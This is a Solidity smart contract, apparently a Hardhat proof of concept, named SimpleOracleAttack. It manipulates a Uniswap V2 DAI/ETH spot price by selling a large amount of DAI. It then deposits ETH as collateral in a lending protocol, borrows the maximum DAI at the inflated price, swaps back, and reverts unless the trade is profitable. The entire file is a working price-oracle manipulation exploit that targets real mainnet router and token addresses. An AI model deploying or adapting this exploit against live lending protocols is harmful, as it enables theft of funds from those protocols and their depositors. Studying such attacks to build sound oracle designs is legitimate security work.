// SPDX-License-Identifier: MIT

pragma solidity =0.6.6;

import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/UniswapV2Router02.sol";
import "@uniswap/lib/contracts/libraries/FixedPoint.sol";
import "./ILendingProtocol.sol";
import "hardhat/console.sol";

contract SimpleOracleAttack is Ownable {
    using FixedPoint for *;

    event SuccessfulAttack(uint256 profit);

    ILendingProtocol private lendingProtocol;

    // UniV2 Router
    address payable private constant uniV2RouterAddress =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    UniswapV2Router02 uniV2Router = UniswapV2Router02(uniV2RouterAddress);
    IUniswapV2Pair private constant daiEthPair =
        IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);

    // DAI
    address private constant daiAddress =
        0x6B175474E89094C44Da98b954EedeAC495271d0F;
    IERC20 private immutable Dai = IERC20(daiAddress);

    // WETH
    address private immutable wethAddress;
    IERC20 private immutable Weth;

    constructor(address lendingProtocolAddress) public {
        lendingProtocol = ILendingProtocol(lendingProtocolAddress);
        address wethAddress_ = uniV2Router.WETH();
        wethAddress = wethAddress_;
        Weth = IERC20(wethAddress_);
    }

    fallback() external payable {}

    receive() external payable {}

    function attack() external {
        uint256 startingEth = address(this).balance;
        uint256 startingDai = Dai.balanceOf(address(this));

        // 1. Swap DAI -> ETH (This increases the ETH price on Uniswap)
        (uint112 daiReserve, uint112 wethReserve, ) = daiEthPair.getReserves();
        uint256 daiToSell = 10000000 ether; // DAI has the same decimals as ETH
        uint256 ethAmountOutMin =
            uniV2Router.getAmountOut(daiToSell, daiReserve, wethReserve);
        require(
            Dai.approve(uniV2RouterAddress, daiToSell),
            "Failed to approve DAI for spending"
        );
        uint256 daiSold;
        uint256 wethBought;
        {
            address[] memory pathDaiWeth = new address[](2);
            pathDaiWeth[0] = daiAddress;
            pathDaiWeth[1] = uniV2Router.WETH();
            uint256[] memory daiWethSwapAmounts =
                uniV2Router.swapExactTokensForETH(
                    daiToSell,
                    ethAmountOutMin,
                    pathDaiWeth,
                    address(this),
                    now + 15 seconds
                );
            daiSold = daiWethSwapAmounts[0];
            wethBought = daiWethSwapAmounts[1];
        }
        uint256 actualEthBought = address(this).balance - startingEth;
        require(wethBought == actualEthBought);

        // 2. Deposit ETH (_NOT_ the ETH we just swapped) into lending protocol
        uint256 ethDeposit = 100 ether;
        lendingProtocol.depositCollateral{value: ethDeposit}();
        console.log("Deposited collateral");

        // 3. Borrow max DAI according to new mid-price that this lending protocol
        // thinks it's at
        uint256 newEthPrice =
            (daiReserve + daiSold) / (wethReserve - wethBought);
        uint256 maxBorrow = (100 * newEthPrice * ethDeposit) / 150;
        console.log(
            "Max borrow: %s > Dai in: %s (%s)",
            maxBorrow,
            daiSold,
            maxBorrow > wethBought
        );
        lendingProtocol.borrowDai(maxBorrow);
        console.log("Borrowed DAI");
        // At this point, we have more DAI than we started with

        // 4. Swap back ETH -> DAI
        require(
            Weth.approve(uniV2RouterAddress, ethAmountOutMin),
            "Failed to approve WETH for spending"
        );
        address[] memory pathWethDai = new address[](2);
        pathWethDai[0] = wethAddress;
        pathWethDai[1] = daiAddress;
        uint256[] memory wethDaiSwapAmounts =
            uniV2Router.swapExactETHForTokens{value: wethBought}(
                (daiSold * 99) / 100, // 1% slippage tolerance
                pathWethDai,
                address(this),
                now + 15 seconds
            );
        console.log(
            "Swapped back %s ETH -> %s DAI",
            wethDaiSwapAmounts[0] / 1e18,
            wethDaiSwapAmounts[1] / 1e18
        );

        // 5. Ensure that we are making a profit!
        uint256 resultingDai = Dai.balanceOf(address(this));
        require(resultingDai > startingDai, "Unprofitable!");
        emit SuccessfulAttack(resultingDai - startingDai);
    }
}
